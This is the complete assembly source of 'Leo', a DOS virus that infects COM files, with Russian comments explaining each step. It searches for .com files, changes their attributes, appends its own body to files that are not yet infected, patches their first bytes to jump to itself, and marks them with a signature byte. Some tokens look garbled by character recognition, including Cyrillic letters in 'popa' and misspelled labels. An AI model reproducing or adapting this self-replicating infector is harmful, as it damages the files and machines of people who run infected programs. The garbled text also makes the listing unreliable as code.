.286 
.model tiny
CheckByte equ 0F0H

;[Указываем, что регистры CS и DS содержат
;адрес сегмента кода программы
assume cs:code, ds:code 

code segment
org 100h 
start: 
;Имитируем зараженный СОМ-файл.
;Тело вируса начинается с метки la
; jmp la 
	db 1 dup(0E9H) ;Код команды JMP 
	dw offset la-offset real
real: 
mov ah,4Ch
int 21h 
;3десь начинается тело вируса
la: 
	pushf
	pusha
	push ds 
	push es 

;Получаем точку входа. 
;Для этого вызываем подпрограмму (следующий 
;за вызовом адрес) и читаем из стека адрес возврата 

	call MySelf
MySelf: 

	pop bp 

;восстанавливаем первые три байта исходной программы
	mov al,[bp+(offset bytes_3[0]-offset MySelf)]
	mov byte ptr cs:[100h],al
	mov al,[bp+(offset bytes_3[1]-offset MySelf)]
	mov byte ptr cs:[101h],al
	mov al,[bp+(offset bytes_3[2]-offset MySelf)]
	mov byte ptr cs:[102h],al 

;Дальнейшая задача вируса - найти новую жертву. 
;Для этого используется функция 4Eh (Найти первый файл). 
;Ищем файл с любыми атрибутами 
Find_First: 

;Ищем первый файл по шаблону имени
	mov ah,4Eh 
        mov dx,offset fname-offset myself
	add dx,bp 
	mov cx,00100111b
	int 21h 
;Если файл найден - переходим к смене атрибутов, иначе выходим
;из вируса (здесь нет подходящих для заражения файлов) 
	jnc attributes 
        jmp exit
attributes: 
;Читаем оригинальные атрибуты файла
	mov ax,4300h 
        mov dx,9Eh 	;Адрес имени файла
	int 21h 
;Сохраняем оригинальные атрибуты файла
	push cx 
;Устанавливаем новые атрибуты файла
	mov ax,4301h 
        mov dx,9Eh ;Адрес имени файла
	mov cx,20h
	int 21h 
;Переходим к открытию файла
	jmp Open 
;Ищем следующий файл, так как предыдущий не подходит
Find_Next: 

;Восстанавливаем оригинальные атрибуты файла
	mov ax,4301h 
        mov dx,9Eh ;Адрес имени файла
	pop cx
	int 21h 
;Закрываем файл
	mov ah,3Eh
	int 21h 
;Ищем следующий файл
	mov ah,4Fh
	int 21h 
;Если файл найден - переходим к смене атрибутов, иначе выходим
;из вируса (здесь нет подходящих для заражения файлов) 
	jnc attributes 
        jmp exit 
;Открываем файл
Open: 
        mov ax,3D02h 
        mov dx,9Eh 
        int 21h 
;Если при открытии файла ошибок не произошло -
;переходим к чтению, иначе выходим из вируса 
	jnc See_Him 
        jmp exit 

;Читаем первый байт файла
See_Him: 
        xchg bx,ax 
        mov ah,3Fh 
        mov dx,offset buf-offset myself 
        add dx,bp 
        xor cx,cx 	;CX=0 
        inc cx 		;[(увеличение на 1) СХ=1 
        int 21h 

;Сравниваем. Если первый байт файла 
;не E9h, то переходим к поиску следующего файла - 
;этот для заражения не подходит 
	cmp byte ptr [bp+(offset buf-offset myself )],0E9H
        jne find_next 

; Переходим в начало файла
	mov ax,4200h	
	xor cx,cx
	xor dx,dx
	int 21h 
;Читаем первые три байта файла в тело вируса
See_Him2: 
	mov ah,3Fh 
	mov dx,offset bytes_3-offset myself 
        add dx,bp 
        mov cx,3 
        int 21h 
;Получаем длину файла, для чего переходим в конец файла
Testik: 
 	mov ax,4202h 
        xor cx,cx 
        xor dx,dx 
        int 21h
Size_test: 

;Сохраняем полученную длину файла 
        mov [bp+(offset flen-offset MySelf)],ax 
;Проверяем длину файла
	cmp ax,64000 
;Если файл не больше 64000 байт,- переходим 
;к следующей проверке, 
;иначе ищем другой файл (этот слишком велик для заражения) 
	jna richJest 
        jmp find_next 
;Проверим, не заражен ли файл.
;Для этого проверим сигнатуру вируса
RichJest: 

;Переходим в конец файла (на последний байт)
	mov ax,4200h
	xor cx,cx 
        mov dx,[bp+(offset flen-offset MySelf)]
	dec dx
	int 21h 

;Читаем сигнатуру вируса
Read: 
        mov ah,3Fh 
        xor cx,cx 
        inc cx 
        mov dx,offset bytik-offset myself 
        add dx,bp
	int 21h 

;Если при чтении файла ошибок 
;не произошло - проверяем сигнатуру, 
;иначе ищем следующий файл 

	jnc test_bytik 
        jmp find_next 
;Проверяем сигнатуру
Test_bytik: 
        cmp byte ptr [bp+(offset bytik-offset myself )],CheckByte 

;Если сигнатура есть, то ищем другой файл,
;если нет - будем заражать 

	jne NotJnfected 
        jmp find_next 

;Файл не заражен - будем заражать
NotJnfected: 

	mov ax,[bp+(offset flen-offset myself)] 
        sub ax,03h 
        mov [bp+(offset jmp_cmd-offset myself)],ax
l_am_copy: 

;Переходим в конец файла
	mov ax,4202h
	xor cx,cx
	xor dx,dx
	int 21h 
;Устанавливаем регистр DS на сегмент кода
	push cs
	pop ds 
;Копируем вирус в файл
	mov ah,40h 
        mov cx,offset VirEnd-offset la
	mov dx,bp 
        sub dx,offset myself-offset la
	int 21h 
;Записываем в начало файла переход на тело вируса
Write_Jmp: 

;Переходим в начало файла
	xor cx,cx	
	xor dx,dx
	mov ax,4200h
	int 21h 
;Записываем первые три байта файла (переход на тело вируса)
	mov ah,40h
	mov cx,3 
	mov dx,offset jmpvir-offset myself
	add dx,bp
	int 21h 
;3акрываем файл
Close: 
        mov ah,3Eh 
        int 21h 
;Восстанавливаем оригинальные атрибуты файла 

	mov ax,4301h 
        mov dx,9Eh 
        pop cx 
        int 21h
exit: 
;восстанавливаем первоначальные значения регистров и флагов
	pop es 
	pop ds
	рора
	popf 
;Передаем управление программе-носителю
	push 100h
	retn 

;Байт для чтения сигнатуры
	bytik db (?) 
;Зарезервировано для изменения трех байт вируса
	jmpvir db 0E9H
	jmp_cmd dw (?) 

;Длина файла
	flen dw (?) 

;Шаблон для поиска файлов
	fname db "*.com",0 

;0бласть для хранения команды перехода
	bytes_3 db 90h, 90h, 90h 

;Байт памяти для чтения первого байта файла
;с целью проверки (Е9п)
	buf db (?) 

;Название вируса
	virus_name db "Leo" 

;Сигнатура 

	a db CheckByte 
VirEnd: 
code ends 
end start 

